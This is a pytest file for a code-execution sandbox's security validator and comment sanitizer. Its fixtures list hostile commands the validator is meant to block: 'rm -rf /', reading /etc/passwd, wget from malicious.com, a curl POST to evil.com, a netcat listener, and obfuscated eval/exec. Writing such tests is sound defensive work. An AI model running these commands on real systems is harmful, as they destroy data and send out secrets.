"""
Unit tests for the security module.
"""

import pytest
from coex.core.security import SecurityValidator, validate_code, sanitize_code
from coex.exceptions import SecurityError


class TestSecurityValidator:
    """Test cases for SecurityValidator class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SecurityValidator()
    
    def test_safe_python_code(self):
        """Test validation of safe Python code."""
        safe_code = """
def add_numbers(a, b):
    return a + b

result = add_numbers(5, 3)
print(result)
"""
        # Should not raise any exception
        self.validator.validate_code(safe_code, "python")
    
    def test_dangerous_import_detection(self):
        """Test detection of dangerous imports."""
        dangerous_codes = [
            "import os\nos.system('rm -rf /')",
            "import subprocess\nsubprocess.call(['rm', '-rf', '/'])",
            "from os import system\nsystem('dangerous command')",
            "import shutil\nshutil.rmtree('/')",
        ]
        
        for code in dangerous_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "python")
    
    def test_dangerous_function_detection(self):
        """Test detection of dangerous function calls."""
        dangerous_codes = [
            "eval('malicious code')",
            "exec('dangerous code')",
            "__import__('os').system('rm -rf /')",
            "compile('bad code', '<string>', 'exec')",
        ]
        
        for code in dangerous_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "python")
    
    def test_blocked_command_detection(self):
        """Test detection of blocked commands."""
        dangerous_codes = [
            "rm -rf /important/files",
            "sudo dangerous_command",
            "wget http://malicious.com/script.sh",
            "curl -X POST http://evil.com/data",
        ]
        
        for code in dangerous_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "python")
    
    def test_blocked_pattern_detection(self):
        """Test detection of blocked patterns."""
        dangerous_codes = [
            "rm -rf /",
            "cat /etc/passwd",
            "> /dev/null",
            "eval(user_input)",
        ]
        
        for code in dangerous_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "python")
    
    def test_javascript_security_validation(self):
        """Test JavaScript-specific security validation."""
        safe_js = """
function addNumbers(a, b) {
    return a + b;
}
console.log(addNumbers(5, 3));
"""
        # Should not raise exception
        self.validator.validate_code(safe_js, "javascript")
        
        dangerous_js_codes = [
            "require('fs').writeFileSync('/etc/passwd', 'hacked')",
            "require('child_process').exec('rm -rf /')",
            "eval('malicious code')",
            "process.exit(1)",
        ]
        
        for code in dangerous_js_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "javascript")
    
    def test_shell_security_validation(self):
        """Test shell script security validation."""
        safe_shell = """
echo "Hello World"
date
"""
        # Should not raise exception for basic commands
        # Note: Shell validation is very restrictive
        
        dangerous_shell_codes = [
            "rm -rf /",
            "sudo rm file",
            "wget http://malicious.com",
            "nc -l 1234",
            "ssh user@host",
        ]
        
        for code in dangerous_shell_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "shell")
    
    def test_file_operation_detection(self):
        """Test detection of potentially dangerous file operations."""
        file_operation_code = """
with open('/etc/passwd', 'w') as f:
    f.write('malicious content')
"""
        # This should trigger a warning but not necessarily fail
        # depending on security settings
        try:
            self.validator.validate_code(file_operation_code, "python")
        except SecurityError:
            pass  # Expected for strict security settings
    
    def test_security_disabled(self):
        """Test behavior when security checks are disabled."""
        from coex.config.settings import settings
        
        # Temporarily disable security
        original_setting = settings.security["enable_security_checks"]
        settings.security["enable_security_checks"] = False
        
        try:
            dangerous_code = "import os; os.system('rm -rf /')"
            # Should not raise exception when security is disabled
            self.validator.validate_code(dangerous_code, "python")
        finally:
            # Restore original setting
            settings.security["enable_security_checks"] = original_setting


class TestCodeSanitizer:
    """Test cases for code sanitization."""
    
    def test_python_comment_removal(self):
        """Test removal of Python comments."""
        code_with_comments = """
def test_function():
    # This is a comment
    return 42  # Another comment
"""
        
        sanitized = sanitize_code(code_with_comments, "python")
        assert "#" not in sanitized
        assert "def test_function():" in sanitized
        assert "return 42" in sanitized
    
    def test_javascript_comment_removal(self):
        """Test removal of JavaScript comments."""
        code_with_comments = """
function test() {
    // Single line comment
    return 42; /* Multi-line
                  comment */
}
"""
        
        sanitized = sanitize_code(code_with_comments, "javascript")
        assert "//" not in sanitized
        assert "/*" not in sanitized
        assert "*/" not in sanitized
        assert "function test()" in sanitized
    
    def test_whitespace_normalization(self):
        """Test normalization of excessive whitespace."""
        code_with_whitespace = """


def test():


    return 42


"""
        
        sanitized = sanitize_code(code_with_whitespace, "python")
        lines = sanitized.split('\n')
        # Should not have multiple consecutive empty lines
        consecutive_empty = 0
        for line in lines:
            if line.strip() == '':
                consecutive_empty += 1
            else:
                consecutive_empty = 0
            assert consecutive_empty <= 1


class TestSecurityFunctions:
    """Test cases for module-level security functions."""
    
    def test_validate_code_function(self):
        """Test the validate_code module function."""
        safe_code = "def test(): return 42"
        validate_code(safe_code, "python")  # Should not raise
        
        dangerous_code = "import os; os.system('rm -rf /')"
        with pytest.raises(SecurityError):
            validate_code(dangerous_code, "python")
    
    def test_sanitize_code_function(self):
        """Test the sanitize_code module function."""
        code_with_comments = "def test(): # comment\n    return 42"
        sanitized = sanitize_code(code_with_comments, "python")
        assert "#" not in sanitized
        assert "def test():" in sanitized


class TestSecurityEdgeCases:
    """Test cases for security edge cases and corner cases."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SecurityValidator()
    
    def test_obfuscated_dangerous_code(self):
        """Test detection of obfuscated dangerous patterns."""
        obfuscated_codes = [
            "getattr(__builtins__, 'eval')('malicious')",
            "globals()['__builtins__']['exec']('bad code')",
            # Base64 encoded dangerous commands might be harder to detect
        ]
        
        for code in obfuscated_codes:
            with pytest.raises(SecurityError):
                self.validator.validate_code(code, "python")
    
    def test_syntax_error_handling(self):
        """Test handling of code with syntax errors."""
        broken_code = """
def broken_function(
    # Missing closing parenthesis
"""
        
        # Should not crash on syntax errors
        try:
            self.validator.validate_code(broken_code, "python")
        except SecurityError:
            pass  # May or may not raise depending on validation
    
    def test_empty_code_validation(self):
        """Test validation of empty or whitespace-only code."""
        empty_codes = ["", "   ", "\n\n\n", "\t\t"]
        
        for code in empty_codes:
            # Should not raise SecurityError for empty code
            self.validator.validate_code(code, "python")
    
    def test_very_long_code_validation(self):
        """Test validation of very long code snippets."""
        long_code = "x = 1\n" * 10000  # Very long but safe code
        
        # Should handle long code without issues
        self.validator.validate_code(long_code, "python")
    
    def test_unicode_code_validation(self):
        """Test validation of code with Unicode characters."""
        unicode_code = """
def test_函数():
    return "Hello, 世界!"
"""
        
        # Should handle Unicode without issues
        self.validator.validate_code(unicode_code, "python")
    
    def test_mixed_language_patterns(self):
        """Test detection when dangerous patterns from other languages appear."""
        mixed_code = """
# This looks like shell but is in Python
def test():
    command = "rm -rf /"  # Just a string, not executed
    return command
"""
        
        # Should detect dangerous patterns even in strings/comments
        with pytest.raises(SecurityError):
            self.validator.validate_code(mixed_code, "python")


if __name__ == "__main__":
    pytest.main([__file__])
